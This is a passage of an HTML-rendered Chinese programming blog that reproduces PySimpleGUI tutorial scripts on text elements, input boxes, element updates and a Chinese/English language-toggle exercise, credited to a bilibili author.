#在同一个布局里也可以用加号拼接。</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">课内所用代码如下：</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">import PySimpleGUI as sg</span></span><br><span class=\"line\"><span class=\"string\">layout=[</span></span><br><span class=\"line\"><span class=\"string\">[sg.Text(&#x27;请输入基本信息&#x27;)],</span></span><br><span class=\"line\"><span class=\"string\">[sg.Text(&#x27;姓名&#x27;)]+[sg.In()]]+[</span></span><br><span class=\"line\"><span class=\"string\">[sg.Text(&#x27;性别&#x27;)]+[sg.In()]]+[</span></span><br><span class=\"line\"><span class=\"string\">[sg.Text(&#x27;国籍&#x27;),sg.In()],</span></span><br><span class=\"line\"><span class=\"string\">[sg.B(&#x27;确认&#x27;),sg.B(&#x27;取消&#x27;)]</span></span><br><span class=\"line\"><span class=\"string\">]</span></span><br><span class=\"line\"><span class=\"string\">window=sg.Window(&#x27;Python教程&#x27;,layout)</span></span><br><span class=\"line\"><span class=\"string\">while True:</span></span><br><span class=\"line\"><span class=\"string\">   event,values=window.read()</span></span><br><span class=\"line\"><span class=\"string\">   if event==None:</span></span><br><span class=\"line\"><span class=\"string\">       break</span></span><br><span class=\"line\"><span class=\"string\">window.close() 作者：程序员无声 https://www.bilibili.com/read/cv15585454 出处：bilibili</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> PySimpleGUI <span class=\"keyword\">as</span> sg</span><br><span class=\"line\">layout=[</span><br><span class=\"line\">[sg.Text(<span class=\"string\">&#x27;请输入基本信息&#x27;</span>)],</span><br><span class=\"line\">[sg.Text(<span class=\"string\">&#x27;姓名&#x27;</span>)]+[sg.In()]]+[</span><br><span class=\"line\">[sg.Text(<span class=\"string\">&#x27;性别&#x27;</span>)]+[sg.In()]]+[</span><br><span class=\"line\">[sg.Text(<span class=\"string\">&#x27;国籍&#x27;</span>),sg.In()],</span><br><span class=\"line\">[sg.B(<span class=\"string\">&#x27;确认&#x27;</span>),sg.B(<span class=\"string\">&#x27;取消&#x27;</span>)]</span><br><span class=\"line\">]</span><br><span class=\"line\">window=sg.Window(<span class=\"string\">&#x27;Python教程&#x27;</span>,layout)</span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">\tevent,values=window.read()</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> event==<span class=\"literal\">None</span>:</span><br><span class=\"line\">\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">window.close()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"7文本元素的设定方法-py\"><a href=\"#7文本元素的设定方法-py\" class=\"headerlink\" title=\"7文本元素的设定方法.py\"></a>7文本元素的设定方法.py</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">文本元素的书写方法及属性的设定方法</span></span><br><span class=\"line\"><span class=\"string\">一般是指单行文本，也可以指多行文本,多行文本时也不会出现滚动条。</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">sg.Text(&#x27;&#x27;),支持简写sg.T(&#x27;&#x27;)</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\"> 设定方法：</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">sg.Text(    text=&quot;&quot;)</span></span><br><span class=\"line\"><span class=\"string\">可设定的属性如下：</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">text=&quot;&quot;, # str:要显示的文本。可以包含/n以实现多行。    </span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">key=None, # [str, int, tuple, object]:                </span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">          # 元素唯一标识符，                </span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">          # 书写规范 key=&#x27;-NMAE-&#x27;。用于元素的定位。    </span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">size=(None, None),# (int, int): 元素宽度,行高    </span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">font=None,# 设定字体的名称,大小                </span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">          # font=&#x27;宋体&#x27;               </span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">          # font=(&#x27;宋体&#x27;,int) or font=[&#x27;宋体&#x27;,int]    </span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">auto_size_text=None,# bool: 元素根据文本自动调节大小    </span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">enable_events=False,# bool: 事件属性,设定为True时，点击文本发生事件。    relief=None, # 浮雕设计 &#x27;raised&#x27;,&#x27;sunken&#x27;,&#x27;flat&#x27;,&#x27;ridge&#x27;,&#x27;solid&#x27;,&#x27;groove&#x27;  border_width=None,# 设定relief时，用来设定边界宽度    </span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">text_color=None, # 文本颜色    </span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">background_color=None,# 文本背景颜色    </span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">justification=None,# 对齐方式: &#x27;left&#x27;,&#x27;right&#x27;,&#x27;center&#x27;    </span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">pad=None,# 元素间隔设定  记住左右上下                    </span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">         # (int, int) or ((int, int),(int,int))                </span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">         #  or (int,(int,int))or ((int, int),int)                </span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">         # (left/right, top/bottom) or ((left, right), (top, bottom))    right_click_menu=None, # 右击调出菜单  </span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">List[List[Union[List[str],str]]]# 设定后,右击此元素可以调出菜单。  grab=False,  # bool:如果为真,点此元素可以移动拖拽窗口    </span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">tooltip=None, # str:悬浮文本 ,当光标置于该元素上方,会显示设定的文本。    visible=True  # bool: 元素可见状态 作者：程序员无声 https://www.bilibili.com/read/cv15585577?spm_id_from=333.999.0.0 出处：bilibili</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> PySimpleGUI <span class=\"keyword\">as</span> sg</span><br><span class=\"line\">text=<span class=\"string\">&#x27;&#x27;&#x27;江南春</span></span><br><span class=\"line\"><span class=\"string\">唐\t杜牧</span></span><br><span class=\"line\"><span class=\"string\">千里莺啼绿映红，</span></span><br><span class=\"line\"><span class=\"string\">水村山郭酒旗风。</span></span><br><span class=\"line\"><span class=\"string\">南朝四百八十寺，</span></span><br><span class=\"line\"><span class=\"string\">多少楼台烟雨中。</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">layout=[</span><br><span class=\"line\">\t[sg.T(<span class=\"string\">&#x27;你好&#x27;</span>),sg.T(<span class=\"string\">&#x27;你好&#x27;</span>),sg.T(<span class=\"string\">&#x27;你好&#x27;</span>)],</span><br><span class=\"line\">\t[sg.T(<span class=\"string\">&#x27;你好&#x27;</span>),sg.T(<span class=\"string\">&#x27;你好&#x27;</span>,pad=((<span class=\"number\">30</span>),(<span class=\"number\">30</span>))),sg.T(<span class=\"string\">&#x27;你好&#x27;</span>)],</span><br><span class=\"line\">\t[sg.T(<span class=\"string\">&#x27;你好&#x27;</span>),sg.T(<span class=\"string\">&#x27;你好&#x27;</span>),sg.T(<span class=\"string\">&#x27;你好&#x27;</span>)],</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># [sg.T(text, \t# sg.Text() 缩写 sg.T()</span></span><br><span class=\"line\"><span class=\"comment\"># \tkey=&#x27;-Text-&#x27;, \t\t# 元素唯一标识符，书写规范key=&#x27;-NMAE-&#x27;, 用于元素的定位</span></span><br><span class=\"line\"><span class=\"comment\"># \tsize=(None,None),\t \t# 元素宽度，行高（int, int）</span></span><br><span class=\"line\"><span class=\"comment\"># \tfont=(&#x27;宋体&#x27;,20),\t# 设定字体的名称，大小，font=&#x27;宋体&#x27;，font=(&#x27;宋体&#x27;,int) or font=[&#x27;宋体&#x27;,int]</span></span><br><span class=\"line\"><span class=\"comment\"># \tauto_size_text=True,  # 当设定值为True时，窗口自动适应文本大小</span></span><br><span class=\"line\"><span class=\"comment\"># \tenable_events=False,\t\t# bool：事件属性，设定为True时，点击文本发生事件。</span></span><br><span class=\"line\"><span class=\"comment\"># \trelief=&#x27;groove&#x27;,\t\t\t\t# 浮雕设计&#x27;raised&#x27;,&#x27;sunken&#x27;,&#x27;flat&#x27;,&#x27;ridge&#x27;,&#x27;solid&#x27;,&#x27;groove&#x27;</span></span><br><span class=\"line\"><span class=\"comment\"># \tborder_width=10,\t\t# 设定relif时，用来设定边界宽度</span></span><br><span class=\"line\"><span class=\"comment\"># \ttext_color=&#x27;grey&#x27;,\t\t# 文本颜色</span></span><br><span class=\"line\"><span class=\"comment\"># \tbackground_color=&#x27;white&#x27;,\t# 文本背景颜色</span></span><br><span class=\"line\"><span class=\"comment\"># \tjustification=None,\t\t# 对齐方式：&#x27;left&#x27;,&#x27;right&#x27;,&#x27;center&#x27;</span></span><br><span class=\"line\"><span class=\"comment\"># \tpad=None,\t\t\t\t# 元素间隔设定，记住左右上下(int,int) or ((int,int),(int,int)) </span></span><br><span class=\"line\"><span class=\"comment\"># \t\t\t\t\t\t\t# or (int, (int,int)) or ((int,int),int) or (left/right,top/bottom) or ((left,right),(top,bottom))</span></span><br><span class=\"line\"><span class=\"comment\"># \tright_click_menu=[&#x27;1&#x27;,[&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;]],\t# 右击调出菜单List[List[Union[List[str],str]]，设定后，右击此元素可以调出菜单</span></span><br><span class=\"line\"><span class=\"comment\"># \tgrab=True,\t\t\t\t# 如果为真，点此元素可以移动拖拽窗口</span></span><br><span class=\"line\"><span class=\"comment\"># \ttooltip=&#x27;这是一个提示文本&#x27;,\t\t\t# str:悬浮文本，光标置于该元素上方，会显示设定的文本</span></span><br><span class=\"line\"><span class=\"comment\"># \tvisible=True \t\t\t# bool：元素可见状态</span></span><br><span class=\"line\"><span class=\"comment\"># \t)</span></span><br><span class=\"line\"><span class=\"comment\"># ]</span></span><br><span class=\"line\">]</span><br><span class=\"line\">window=sg.Window(<span class=\"string\">&#x27;Python教程&#x27;</span>,layout)</span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">\tevent,value=window.read()</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> event==<span class=\"literal\">None</span>:</span><br><span class=\"line\">\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> event== <span class=\"string\">&#x27;-Text-&#x27;</span>:</span><br><span class=\"line\">\t\tsg.Popup(<span class=\"string\">&#x27;运行一个点击事件&#x27;</span>)</span><br><span class=\"line\">window.close()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"8设定文本元素的更新的方法-py\"><a href=\"#8设定文本元素的更新的方法-py\" class=\"headerlink\" title=\"8设定文本元素的更新的方法.py\"></a>8设定文本元素的更新的方法.py</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">在事件发生后，需要更新文本元素的设定方法</span></span><br><span class=\"line\"><span class=\"string\">元素的更新方法</span></span><br><span class=\"line\"><span class=\"string\">window[key].update()</span></span><br><span class=\"line\"><span class=\"string\">window[key].Update()</span></span><br><span class=\"line\"><span class=\"string\">文本元素可以更新的属性</span></span><br><span class=\"line\"><span class=\"string\">update(</span></span><br><span class=\"line\"><span class=\"string\">\tvalue=None, # str 更新文本</span></span><br><span class=\"line\"><span class=\"string\">\tbackground_color=None, # 更新文本背景颜色</span></span><br><span class=\"line\"><span class=\"string\">\ttext_color=None, # 更新文本颜色</span></span><br><span class=\"line\"><span class=\"string\">\tfont=None, # 更新字体的名称或者大小</span></span><br><span class=\"line\"><span class=\"string\">\tvisible=None # 更新元素的可见状态</span></span><br><span class=\"line\"><span class=\"string\">)</span></span><br><span class=\"line\"><span class=\"string\">举例说明</span></span><br><span class=\"line\"><span class=\"string\">更新文本显示</span></span><br><span class=\"line\"><span class=\"string\">window[key].update(value=&#x27;&#x27;)</span></span><br><span class=\"line\"><span class=\"string\">window[key].update(&#x27;&#x27;)</span></span><br><span class=\"line\"><span class=\"string\">更新文本背景颜色</span></span><br><span class=\"line\"><span class=\"string\">window[key].update(background_color=&#x27;red&#x27;)</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> PySimpleGUI <span class=\"keyword\">as</span> sg</span><br><span class=\"line\">layout=[</span><br><span class=\"line\">[sg.T(<span class=\"string\">&#x27;程序员无声&#x27;</span>,key=<span class=\"string\">&#x27;-Text-&#x27;</span>),sg.B(<span class=\"string\">&#x27;点赞&#x27;</span>)]</span><br><span class=\"line\">]</span><br><span class=\"line\">window=sg.Window(<span class=\"string\">&#x27;Python图形界面开发教程&#x27;</span>,layout)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">\tevent,values=window.read()</span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(event)</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> event==<span class=\"literal\">None</span>:</span><br><span class=\"line\">\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> event == <span class=\"string\">&#x27;点赞&#x27;</span>:</span><br><span class=\"line\">\t\twindow[<span class=\"string\">&#x27;-Text-&#x27;</span>].update(</span><br><span class=\"line\">\t\t\tvalue=<span class=\"string\">&#x27;谢谢支持！&#x27;</span>, <span class=\"comment\"># str 更新文本</span></span><br><span class=\"line\">\t\t\tbackground_color=<span class=\"string\">&#x27;white&#x27;</span>, <span class=\"comment\"># 更新文本背景颜色</span></span><br><span class=\"line\">\t\t\ttext_color=<span class=\"string\">&#x27;black&#x27;</span>, <span class=\"comment\"># 更新文本颜色</span></span><br><span class=\"line\">\t\t\tfont=(<span class=\"string\">&#x27;黑体&#x27;</span>,<span class=\"number\">30</span>), <span class=\"comment\"># 更新字体的名称或者大小</span></span><br><span class=\"line\">\t\t\tvisible=<span class=\"literal\">None</span> <span class=\"comment\"># 更新元素的可见状态</span></span><br><span class=\"line\">\t\t\t)</span><br><span class=\"line\"></span><br><span class=\"line\">window.close()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"9练习-制作一个可中英文切换的页面-py\"><a href=\"#9练习-制作一个可中英文切换的页面-py\" class=\"headerlink\" title=\"9练习-制作一个可中英文切换的页面.py\"></a>9练习-制作一个可中英文切换的页面.py</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 1. 导入库</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> PySimpleGUI <span class=\"keyword\">as</span> sg</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 2. 定义布局，确定行数</span></span><br><span class=\"line\">layout=[</span><br><span class=\"line\">\t\t\t[sg.B(<span class=\"string\">&#x27;中文&#x27;</span>),sg.B(<span class=\"string\">&#x27;English&#x27;</span>)],</span><br><span class=\"line\">\t\t\t[sg.Text(<span class=\"string\">&#x27;请输入您的基本信息&#x27;</span>,key=<span class=\"string\">&#x27;-top-&#x27;</span>)],</span><br><span class=\"line\">\t\t\t[sg.Text(<span class=\"string\">&#x27;姓名&#x27;</span>,key=<span class=\"string\">&#x27;-name-&#x27;</span>,size=(<span class=\"number\">8</span>,<span class=\"number\">1</span>)),sg.InputText(<span class=\"string\">&#x27;xx&#x27;</span>)],</span><br><span class=\"line\">\t\t\t[sg.Text(<span class=\"string\">&#x27;性别&#x27;</span>,key=<span class=\"string\">&#x27;-sex-&#x27;</span>,size=(<span class=\"number\">8</span>,<span class=\"number\">1</span>)),sg.InputText(<span class=\"string\">&#x27;xx&#x27;</span>)],</span><br><span class=\"line\">\t\t\t[sg.Text(<span class=\"string\">&#x27;国籍&#x27;</span>,key=<span class=\"string\">&#x27;-nation-&#x27;</span>,size=(<span class=\"number\">8</span>,<span class=\"number\">1</span>)),sg.InputText(<span class=\"string\">&#x27;xx&#x27;</span>)],</span><br><span class=\"line\">\t\t\t[sg.Button(<span class=\"string\">&#x27;确定&#x27;</span>,key=<span class=\"string\">&#x27;-confirm-&#x27;</span>),sg.Button(<span class=\"string\">&#x27;取消&#x27;</span>,key=<span class=\"string\">&#x27;-cancel-&#x27;</span>)]</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 3. 创建窗口</span></span><br><span class=\"line\">window=sg.Window(<span class=\"string\">&#x27;Python GUI&#x27;</span>, layout)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 4. 事件循环</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">\tevent,value=window.read() <span class=\"comment\"># 窗口的读取，有两个返回值（1.事件 2.值）</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> event==<span class=\"literal\">None</span>:  <span class=\"comment\"># 窗口关闭事件</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> event == <span class=\"string\">&#x27;中文&#x27;</span>:</span><br><span class=\"line\">\t\twindow[<span class=\"string\">&#x27;-top-&#x27;</span>].update(</span><br><span class=\"line\">\t\t\tvalue=<span class=\"string\">&#x27;请输入您的基本信息&#x27;</span>, <span class=\"comment\"># str 更新文本</span></span><br><span class=\"line\">\t\t\t)</span><br><span class=\"line\">\t\twindow[<span class=\"string\">&#x27;-name-&#x27;</span>].update(<span class=\"string\">&#x27;姓名&#x27;</span>)</span><br><span class=\"line\">\t\twindow[<span class=\"string\">&#x27;-sex-&#x27;</span>].update(</span><br><span class=\"line\">\t\t\tvalue=<span class=\"string\">&#x27;性别&#x27;</span>, <span class=\"comment\"># str 更新文本</span></span><br><span class=\"line\">\t\t\t)</span><br><span class=\"line\">\t\twindow[<span class=\"string\">&#x27;-nation-&#x27;</span>].update(</span><br><span class=\"line\">\t\t\tvalue=<span class=\"string\">&#x27;国籍&#x27;</span>, <span class=\"comment\"># str 更新文本</span></span><br><span class=\"line\">\t\t\t)</span><br><span class=\"line\">\t\twindow[<span class=\"string\">&#x27;-confirm-&#x27;</span>].update(<span class=\"string\">&#x27;确认&#x27;</span>)</span><br><span class=\"line\">\t\twindow[<span class=\"string\">&#x27;-cancel-&#x27;</span>].update(<span class=\"string\">&#x27;取消&#x27;</span>)</span><br><span class=\"line\">\t\t<span class=\"keyword\">continue</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> event == <span class=\"string\">&#x27;English&#x27;</span>:</span><br><span class=\"line\">\t\twindow[<span class=\"string\">&#x27;-top-&#x27;</span>].update(</span><br><span class=\"line\">\t\t\tvalue=<span class=\"string\">&#x27;Please enter basic information&#x27;</span>, <span class=\"comment\"># str 更新文本</span></span><br><span class=\"line\">\t\t\t)</span><br><span class=\"line\">\t\twindow[<span class=\"string\">&#x27;-name-&#x27;</span>].update(</span><br><span class=\"line\">\t\t\tvalue=<span class=\"string\">&#x27;Name&#x27;</span>, <span class=\"comment\"># str 更新文本</span></span><br><span class=\"line\">\t\t\t)</span><br><span class=\"line\">\t\twindow[<span class=\"string\">&#x27;-sex-&#x27;</span>].update(</span><br><span class=\"line\">\t\t\tvalue=<span class=\"string\">&#x27;Sex&#x27;</span>, <span class=\"comment\"># str 更新文本</span></span><br><span class=\"line\">\t\t\t)</span><br><span class=\"line\">\t\twindow[<span class=\"string\">&#x27;-nation-&#x27;</span>].update(</span><br><span class=\"line\">\t\t\tvalue=<span class=\"string\">&#x27;Nationality&#x27;</span>, <span class=\"comment\"># str 更新文本</span></span><br><span class=\"line\">\t\t\t)</span><br><span class=\"line\">\t\twindow[<span class=\"string\">&#x27;-confirm-&#x27;</span>].update(<span class=\"string\">&#x27;Confirm&#x27;</span>)</span><br><span class=\"line\">\t\twindow[<span class=\"string\">&#x27;-cancel-&#x27;</span>].update(<span class=\"string\">&#x27;Cancel&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 5. 关闭窗口</span></span><br><span class=\"line\">window.close()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"10单行输入框元素的设定方法-py\"><a href=\"#10单行输入框元素的设定方法-py\" class=\"headerlink\" title=\"10单行输入框元素的设定方法.py\"></a>10单行输入框元素的设定方法.py</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">单行输入框元素的设定方法</span></span><br><span class=\"line\"><span class=\"string\">sg.In(&#x27;你好&#x27;,size=(30,None),password_char=&#x27;*&#x27;)</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> PySimpleGUI <span class=\"keyword\">as</span> sg</span><br><span class=\"line\">layout=[</span><br><span class=\"line\">[sg.T(<span class=\"string\">&#x27;账号：&#x27;</span>),sg.In(</span><br><span class=\"line\">    <span class=\"string\">&#x27;请输入您的账号&#x27;</span>,  <span class=\"comment\"># 默认值设定，可以为空字符串</span></span><br><span class=\"line\">    key=<span class=\"string\">&#x27;-Text-&#x27;</span>, \t\t<span class=\"comment\"># 元素唯一标识符，书写规范key=&#x27;-NMAE-&#x27;, 用于元素的定位</span></span><br><span class=\"line\">\tsize=(<span class=\"literal\">None</span>,<span class=\"literal\">None</span>),\t \t<span class=\"comment\"># 元素宽度，行高（int, int）</span></span><br><span class=\"line\">    disabled=<span class=\"literal\">None</span>,      <span class=\"comment\"># bool：元素禁用，如果为True则禁用，无法输入任何值</span></span><br><span class=\"line\">    password_char=<span class=\"string\">&#x27;&#x27;</span>,   <span class=\"comment\"># 密码字符，一般设置为*</span></span><br><span class=\"line\">\tfont=(<span class=\"string\">&#x27;宋体&#x27;</span>,<span class=\"number\">20</span>),    \t<span class=\"comment\"># 设定字体的名称，大小，font=&#x27;宋体&#x27;，font=(&#x27;宋体&#x27;,int) or font=[&#x27;宋体&#x27;,int]</span></span><br><span class=\"line\">\tenable_events=<span class=\"literal\">False</span>,\t\t<span class=\"comment\"># bool：事件属性，设定为True时，点击文本发生事件。</span></span><br><span class=\"line\">\tborder_width=<span class=\"number\">10</span>,\t\t<span class=\"comment\"># 设定relif时，用来设定边界宽度</span></span><br><span class=\"line\">\ttext_color=<span class=\"string\">&#x27;grey&#x27;</span>,\t\t<span class=\"comment\"># 文本颜色</span></span><br><span class=\"line\">\tbackground_color=<span class=\"string\">&#x27;white&#x27;</span>,\t<span class=\"comment\"># 文本背景颜色</span></span><br><span class=\"line\">\tjustification=<span class=\"literal\">None</span>,\t\t<span class=\"comment\"># 对齐方式：&#x27;left&#x27;,&#x27;right&#x27;,&#x27;center&#x27;</span></span><br><span class=\"line\">\tpad=<span class=\"literal\">None</span>,\t\t\t\t<span class=\"comment\"># 元素间隔设定，记住左右上下(int,int) or ((int,int),(int,int))</span></span><br><span class=\"line\">\t\t\t\t\t\t\t<span class=\"comment\"># or (int, (int,int)) or ((int,int),int) or (left/right,top/bottom) or ((left,right),(top,bottom))</span></span><br><span class=\"line\">\tright_click_menu=[<span class=\"string\">&#x27;1&#x27;</span>,[<span class=\"string\">&#x27;1&#x27;</span>,<span class=\"string\">&#x27;2&#x27;</span>,<span class=\"string\">&#x27;3&#x27;</span>]],\t<span class=\"comment\"># 右击调出菜单List[List[Union[List[str],str]]，设定后，右击此元素可以调出菜单</span></span><br><span class=\"line\">\ttooltip=<span class=\"string\">&#x27;这是一个提示文本&#x27;</span>,\t\t\t<span class=\"comment\"># str:悬浮文本，光标置于该元素上方，会显示设定的文本</span></span><br><span class=\"line\">\tvisible=<span class=\"literal\">True</span>,</span><br><span class=\"line\">    do_not_clear=<span class=\"literal\">True</span>,       <span class=\"comment\"># bool：输入框内容不被清除。如果为False，一发生事件，该输入框内的值会被清除。</span></span><br><span class=\"line\">    focus=<span class=\"literal\">False</span>,    <span class=\"comment\"># bool：设定焦点，如果为True，则光标显示在此输入框。</span></span><br><span class=\"line\">    disabled_readonly_background_color=<span class=\"literal\">None</span>,  <span class=\"comment\"># str：元素禁用时的背景颜色设定</span></span><br><span class=\"line\">    disabled_readonly_text_color=<span class=\"literal\">None</span>,  <span class=\"comment\"># 元素禁用时的文本颜色设定</span></span><br><span class=\"line\"></span><br><span class=\"line\">)],</span><br><span class=\"line\">[sg.T(<span class=\"string\">&#x27;密码：&#x27;</span>),sg.In(<span class=\"string\">&#x27;&#x27;</span>,focus=<span class=\"literal\">True</span>)],</span><br><span class=\"line\">[sg.B(<span class=\"string\">&#x27;确定&#x27;</span>),sg.B(<span class=\"string\">&#x27;取消&#x27;</span>)]</span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\">window=sg.Window(<span class=\"string\">&#x27;Python GUI&#x27;</span>, layout)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">\tevent,value=window.read() <span class=\"comment\"># 窗口的读取，有两个返回值（1.事件 2.值）</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> event==<span class=\"literal\">None</span>:  <span class=\"comment\"># 窗口关闭事件</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br><span class=\"line\">window.close()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"11单行输入框元素的更新方法-py\"><a href=\"#11单行输入框元素的更新方法-py\" class=\"headerlink\" title=\"11单行输入框元素的更新方法.py\"></a>11单行输入框元素的更新方法.py</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">1.用update的方法更新元素</span></span><br><span class=\"line\"><span class=\"string\">2.用SetFocus的方法更新元素的焦点</span></span><br><span class=\"line\"><span class=\"string\">3.用SetTooltip的方法更新元素的悬浮文本</span></span><br><span class=\"line\"><span class=\"string\">update方法，用于元素的更新</span></span><br><span class=\"line\"><span class=\"string\">window[key].update()</span></span><br><span class=\"line\"><span class=\"string\">window[key].Update()</span></span><br><span class=\"line\"><span class=\"string\">SetFocus方法，用于元素设置焦点</span></span><br><span class=\"line\"><span class=\"string\">window[key].SetFocus()</span></span><br><span class=\"line\"><span class=\"string\">window[key].set_focus()</span></span><br><span class=\"line\"><span class=\"string\">SetTooltip方法，用于元素的更新</span></span><br><span class=\"line\"><span class=\"string\">window[key].SetTooltip(&#x27;&#x27;)</span></span><br><span class=\"line\"><span class=\"string\">window[key].set_tooltip(&#x27;&#x27;)</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> PySimpleGUI <span class=\"keyword\">as</span> sg</span><br><span class=\"line\">layout=[</span><br><span class=\"line\">[[sg.In(i,key=i)] <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"string\">&#x27;abcd&#x27;</span>],</span><br><span class=\"line\">[sg.B(<span class=\"string\">&#x27;确定&#x27;</span>),sg.B(<span class=\"string\">&#x27;取消&#x27;</span>)]</span><br><span class=\"line\"></span><br><span class=\"line\">]</span><br><span class=\"line\">window=sg.Window(<span class=\"string\">&#x27;python练习窗口&#x27;</span>,layout,keep_on_top=<span class=\"literal\">True</span>)</span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    event,values=window.read()</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(event)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> event == <span class=\"literal\">None</span>:</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> event == <span class=\"string\">&#x27;确定&#x27;</span>:</span><br><span class=\"line\">        window[<span class=\"string\">&#x27;d&#x27;</span>].SetFocus() <span class=\"comment\"># 用于更新元素的焦点</span></span><br><span class=\"line\">        window[<span class=\"string\">&#x27;d&#x27;</span>].SetTooltip(<span 